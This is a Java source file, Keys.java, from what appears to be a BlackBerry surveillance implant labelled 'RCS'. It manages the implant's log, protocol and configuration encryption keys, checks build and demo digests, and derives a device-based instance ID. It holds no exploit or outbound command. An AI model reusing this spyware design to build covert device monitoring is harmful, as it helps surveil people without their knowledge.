//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Keys.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.config;

import net.rim.device.api.crypto.MD5Digest;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.Arrays;
import blackberry.Device;
import blackberry.crypto.Encryption;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.Singleton;
import fake.InstanceKeysFake;

/**
 * The Class Keys.
 */
public final class Keys implements Singleton {

    //#ifdef DEBUG
    static Debug debug = new Debug("Keys", DebugLevel.VERBOSE);
    //#endif

    InstanceKeys instanceKeys;

    static private Keys instance = null;
    private static final long GUID = 0x6b3391c7148645b7L;

    protected byte[] byteLogKey;
    protected byte[] byteProtoKey;
    protected byte[] byteConfKey;
    protected byte[] byteBuildID;
    //private static byte[] byteInstanceID;
    private byte[] byteInstanceID;

    private static byte[] buildDigest = new byte[] { (byte) 0x7f, (byte) 0x9e,
            (byte) 0x6a, (byte) 0xe, (byte) 0xd9, (byte) 0x96, (byte) 0x54,
            (byte) 0x58, (byte) 0xd8, (byte) 0xc1, (byte) 0xf1, (byte) 0xa5,
            (byte) 0x58, (byte) 0x71, (byte) 0x3e, (byte) 0x9d };
    private static byte[] demoDigest = new byte[] { (byte) 0xba, (byte) 0xba,
            (byte) 0x73, (byte) 0xe6, (byte) 0x7e, (byte) 0x39, (byte) 0xdb,
            (byte) 0x5d, (byte) 0x94, (byte) 0xf3, (byte) 0xc6, (byte) 0x7a,
            (byte) 0x58, (byte) 0xd5, (byte) 0x2c, (byte) 0x52 };

    //#ifdef DEBUG
    public String log = "";

    //#endif

    /**
     * Gets the single instance of Keys.
     * 
     * @return single instance of Keys
     */
    private static synchronized Keys getInstance(
            InstanceKeysFake instanceKeyEmbedded) {
        boolean fake = false;
        //#ifdef FAKECONF
        fake = true;
        //#endif

        if (!isInstanced() || instance.getLogKey() == null) {
            instance = (Keys) RuntimeStore.getRuntimeStore().get(GUID);
            if (instance == null) {
                instance = new Keys();

                if (fake) {
                    //#ifdef DBC
                    Check.asserts(instanceKeyEmbedded != null,
                            "Null instanceKeyEmbedded");
                    //#endif
                }

                if (instanceKeyEmbedded != null) {
                    instance.setKeys(instanceKeyEmbedded);
                }

                RuntimeStore.getRuntimeStore().put(GUID, instance);
            }
        }

        //#ifdef DBC
        Check.ensures(instance.getLogKey() != null, "Null LOGKEY");
        //#endif

        return instance;
    }

    public static Keys getFakeInstance(InstanceKeysFake instance) {
        return getInstance(instance);
    }

    public static Keys getInstance() {
        return getInstance(null);
    }

    public static synchronized boolean isInstanced() {
        return (instance != null);
    }

    /**
     * Checks for been binary patched.
     * 
     * @return true, if successful
     */
    public boolean hasBeenBinaryPatched() {
        //boolean ret = !buildID.startsWith("av3pVck1gb4eR");
        MD5Digest digest = new MD5Digest();
        digest.update(instanceKeys.getBuildID());
        byte[] calculated = digest.getDigest();
        boolean ret = !Arrays.equals(calculated, buildDigest);
        //#ifdef FAKECONF
        ret = true;
        //#endif

        return ret;
    }

    /**
     * Checks if demo.
     * 
     * @return true, if successful
     */
    public boolean isDemo() {
        MD5Digest digest = new MD5Digest();
        digest.update(instanceKeys.getDemo());
        byte[] calculated = digest.getDigest();
        boolean ret = Arrays.equals(calculated, demoDigest);
        //#ifdef NODEMO
        ret = false;
        //#endif

        return ret;
    }

    private Keys() {
        instanceKeys = new InstanceKeys();
        setKeys(instanceKeys);
    }

    private void setKeys(KeysGetter instanceKeys) {
        byteLogKey = Arrays.copy(instanceKeys.getLogKey(), 0, 16);
        byteProtoKey = Arrays.copy(instanceKeys.getProtoKey(), 0, 16);
        byteConfKey = Arrays.copy(instanceKeys.getConfKey(), 0, 16);
        byteBuildID = instanceKeys.getBuildID();
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return byteBuildID;
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        return byteConfKey;
    }

    /**
     * Gets the instance id.
     * 
     * @return the instance id
     */
    public byte[] getInstanceId() {
        if (byteInstanceID == null) {
            final Device device = Device.getInstance();
            final byte[] deviceid = device.getWDeviceId();
            byteInstanceID = Encryption.SHA1(deviceid);
        }
        return byteInstanceID;
    }

}